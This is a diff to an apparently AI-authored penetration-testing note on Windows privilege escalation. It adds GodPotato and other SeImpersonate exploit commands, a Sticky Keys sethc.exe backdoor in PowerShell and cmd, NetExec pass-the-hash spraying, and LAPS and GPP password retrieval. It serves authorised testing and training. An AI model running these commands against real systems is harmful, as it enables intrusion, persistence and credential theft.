@@ -14,23 +14,25 @@ Common writable staging dir: `C:\Windows\Temp`
 
 | Tool | Use |
 |------|-----|
-| [winPEAS](https://github.com/carlospolop/PEASS-ng/tree/master/winPEAS) | Automated enumeration, finds most common vectors |
-| [PowerUp](https://github.com/PowerShellMafia/PowerSploit/blob/master/Privesc/PowerUp.ps1) | PowerShell — service misconfigs, weak perms |
+| [[Tools/Scanning/winPEAS\|winPEAS]] | Automated enumeration, finds most common vectors |
+| [[Tools/Scanning/PowerUp\|PowerUp]] | PowerShell — service misconfigs, weak perms |
+| [[Tools/Scanning/Seatbelt\|Seatbelt]] | Host situational awareness, broad recon |
+| [[Tools/Lateral Movement/Potato\|Potato family]] | SeImpersonate → SYSTEM — pick by OS, see the table below |
+| [[Tools/Credential Dumping/mimikatz\|Mimikatz]] | Credential dumping, token manipulation, PTH |
+| [[Tools/Credential Dumping/LaZagne\|LaZagne]] | Dumps stored creds (browsers, git, wifi, etc.) |
+| [[Tools/Credential Dumping/SharpDPAPI\|SharpDPAPI]] | DPAPI blob decryption |
+| [[Tools/AD/Snaffler\|Snaffler]] | Finds creds/configs in file shares |
+| [[Tools/AD/Certipy\|Certipy]] | AD CS enumeration and ESC1–ESC13 exploitation (Linux) |
+| [[Tools/AD/Certify\|Certify]] | AD CS enumeration and abuse (Windows/C#) |
+| [[Tools/Lateral Movement/Rubeus\|Rubeus]] | Kerberos ticket ops — cert → TGT, PTT |
+| [[Tools/Lateral Movement/NetExec\|NetExec]] | Cred validation, PTH, `-M` modules at scale (replaces CrackMapExec) |
 | [SharpUp](https://github.com/GhostPack/SharpUp) | C# version of PowerUp |
-| [Seatbelt](https://github.com/GhostPack/Seatbelt) | Host situational awareness, broad recon |
 | [Watson](https://github.com/rasta-mouse/Watson) | Missing KBs → suggests kernel exploits |
 | [WES-NG](https://github.com/bitsadmin/wesng) | `systeminfo` → exploit suggestions |
-| [LaZagne](https://github.com/AlessandroZ/LaZagne) | Dumps stored creds (browsers, git, wifi, etc.) |
 | [SessionGopher](https://github.com/Arvanaghi/SessionGopher) | PuTTY, WinSCP, RDP saved sessions |
-| [Snaffler](https://github.com/SnaffCon/Snaffler) | Finds creds/configs in file shares |
 | [AccessChk](https://docs.microsoft.com/en-us/sysinternals/downloads/accesschk) | Sysinternals — check object permissions |
-| [PrintSpoofer](https://github.com/itm4n/PrintSpoofer) | SeImpersonate → SYSTEM (Win10/Server 2016+) |
-| [RoguePotato](https://github.com/antonioCoco/RoguePotato) | SeImpersonate → SYSTEM (Server 2019+) |
-| [JuicyPotatoNG](https://github.com/antonioCoco/JuicyPotatoNG) | SeImpersonate → SYSTEM (modern systems) |
-| [Mimikatz](https://github.com/gentilkiwi/mimikatz) | Credential dumping, token manipulation, PTH |
-| [SharpDPAPI](https://github.com/GhostPack/SharpDPAPI) | DPAPI blob decryption |
-| [keepass2john](https://github.com/openwall/john) | Extract hash from .kdbx for cracking |
 | [PrivescCheck](https://github.com/itm4n/PrivescCheck) | PowerShell privesc enum — `Invoke-PrivescCheck -Extended` |
+| `keepass2john` | Extract hash from `.kdbx` for cracking — ships with john |
 
 ---
 
@@ -214,14 +216,20 @@ Common on service accounts (IIS, MSSQL, Windows services).
 
 **OS compatibility — use the right tool:**
 
-| Tool | Target OS |
-|------|-----------|
-| JuicyPotato | Windows ≤ Server 2016 / Win 10 ≤ 1803 |
-| PrintSpoofer | Windows 10 / Server 2016+ |
-| RoguePotato | Server 2019+ |
-| JuicyPotatoNG | Modern systems (replaces JuicyPotato) |
+| Tool | Target OS | Requires |
+|------|-----------|----------|
+| **GodPotato** | Server 2012–2022, Win 8–11 — **widest coverage, try first** | DCOM/RPC (no spooler) |
+| SigmaPotato | Same as GodPotato — fork adding in-memory / .NET reflection loading | DCOM/RPC |
+| PrintSpoofer | Windows 10 / Server 2016+ | **Print Spooler service running** |
+| RoguePotato | Server 2019+ | Outbound to attacker on 135, or a local redirector |
+| JuicyPotatoNG | Modern systems (replaces JuicyPotato) | A usable CLSID |
+| JuicyPotato | Windows ≤ Server 2016 / Win 10 ≤ 1803 — **legacy only** | A usable CLSID |
 
 ```powershell
+# GodPotato — pick the binary matching the target's .NET runtime
+.\GodPotato-NET4.exe -cmd "cmd /c whoami"
+.\GodPotato-NET4.exe -cmd "C:\Windows\Temp\evil.exe"
+
 # PrintSpoofer
 .\PrintSpoofer64.exe -i -c cmd
 
@@ -230,6 +238,14 @@ Common on service accounts (IIS, MSSQL, Windows services).
 
 # JuicyPotatoNG
 .\JuicyPotatoNG.exe -t * -p "C:\Windows\Temp\evil.exe"
+```
+
+> [!warning]
+> **PrintSpoofer needs the Print Spooler service.** Since PrintNightmare (CVE-2021-34527) spooler is disabled by default on servers and hardened environments, so PrintSpoofer fails on plenty of current targets. Check first — `sc query spooler` — and fall back to **GodPotato**, which uses DCOM/RPC and doesn't depend on it.
+
+```powershell
+sc query spooler          # PrintSpoofer viable only if RUNNING
+whoami /priv | findstr /i impersonate
 ```
 
 **Via Meterpreter — incognito module:**
@@ -281,15 +297,25 @@ copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\System32\config\SYS
 ### SeTakeOwnershipPrivilege — Object Takeover
 
 ```powershell
-# Take ownership then grant full control
+# PowerShell — %username% does NOT expand here, use $env:USERNAME
 takeown /f "C:\path\to\file.exe"
-icacls "C:\path\to\file.exe" /grant "%username%":F
+icacls "C:\path\to\file.exe" /grant "$($env:USERNAME):F"
 
 # Sticky Keys backdoor (SYSTEM cmd at login screen — press Shift x5)
+takeown /f C:\Windows\System32\sethc.exe
+icacls C:\Windows\System32\sethc.exe /grant "$($env:USERNAME):F"
+copy /y C:\Windows\System32\cmd.exe C:\Windows\System32\sethc.exe
+```
+
+```cmd
+:: Same thing from cmd.exe, where %username% is correct
 takeown /f C:\Windows\System32\sethc.exe
 icacls C:\Windows\System32\sethc.exe /grant "%username%":F
 copy /y C:\Windows\System32\cmd.exe C:\Windows\System32\sethc.exe
 ```
+
+> [!note]
+> `%VAR%` is cmd.exe syntax and is passed through as a **literal string** by PowerShell — `icacls ... /grant "%username%":F` silently grants nothing useful. Blocks in this note labelled `powershell` use `$env:USERNAME`; the `cmd` variant is shown above where the distinction matters.
 
 ---
 
@@ -367,8 +393,8 @@ Get-ChildItem -Path "\\<DOMAIN>\SYSVOL" -Recurse -ErrorAction SilentlyContinue -
 # Decrypt on Kali
 gpp-decrypt <cpassword_value>
 
-# Or via CrackMapExec
-crackmapexec smb <DC_IP> -u <user> -p <pass> -M gpp_password
+# Or via NetExec
+netexec smb <DC_IP> -u <user> -p <pass> -M gpp_password
 ```
 
 ---
@@ -414,9 +440,9 @@ impacket-psexec <DOMAIN>/<USER>@<TARGET_IP> -hashes :<NTLM_HASH>
 # impacket-wmiexec (WMI — semi-interactive, less noisy)
 impacket-wmiexec <DOMAIN>/<USER>@<TARGET_IP> -hashes :<NTLM_HASH>
 
-# CrackMapExec — spray hash across multiple targets
-crackmapexec smb <TARGET_IP> -u <USER> -H <NTLM_HASH>
-crackmapexec smb <CIDR> -u <USER> -H <NTLM_HASH> --local-auth
+# NetExec — spray hash across multiple targets
+netexec smb <TARGET_IP> -u <USER> -H <NTLM_HASH>
+netexec smb <CIDR> -u <USER> -H <NTLM_HASH> --local-auth
 ```
 
 ---
@@ -602,7 +628,7 @@ Get-DomainComputer <ComputerName> -Properties ms-Mcs-AdmPwd
 ```
 
 ```bash
-crackmapexec ldap <DC_IP> -u <USER> -p <PASS> -M laps
+netexec ldap <DC_IP> -u <USER> -p <PASS> -M laps
 ```
 
 ---
@@ -611,7 +637,10 @@ crackmapexec ldap <DC_IP> -u <USER> -p <PASS> -M laps
 
 If you have write access to a network share that users browse, plant a malicious file to capture NTLMv2 hashes.
 
-### SCF File
+> [!warning]
+> **Try `.url` / `.lnk` first — SCF is largely dead.** Microsoft patched the Explorer auto-icon-fetch behaviour that made `.scf` leak hashes (2017, Windows 10 1703+ and back-ported). On any patched host the SCF file simply sits there. Keep it in the kit for legacy targets, but `.url` and `.library-ms` are the ones that still fire on current Windows.
+
+### SCF File (legacy — patched 2017+)
 
 Create `@evil.scf` (the `@` sorts it to the top of the directory):
 
@@ -946,5 +975,5 @@ OTHER VECTORS
 ---
 
 *Created: 2026-02-27*
-*Updated: 2026-07-21*
-*Model: claude-sonnet-4-6*
+*Updated: 2026-08-18*
+*Model: claude-opus-5*
